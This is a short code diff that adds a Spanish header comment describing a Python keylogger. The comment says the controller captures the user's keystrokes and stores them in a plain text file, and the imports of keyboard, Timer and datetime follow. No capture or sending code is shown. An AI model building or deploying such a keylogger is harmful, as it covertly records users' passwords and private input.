@@ -1,3 +1,9 @@
+# KeyLogger
+# 
+# Este Controlador se encarga de capturar las teclas tipeadas por el usuario y almacenar los datos en
+# un fichero de texto plano.
+
+
 import keyboard
 from threading import Timer
 from datetime import datetime
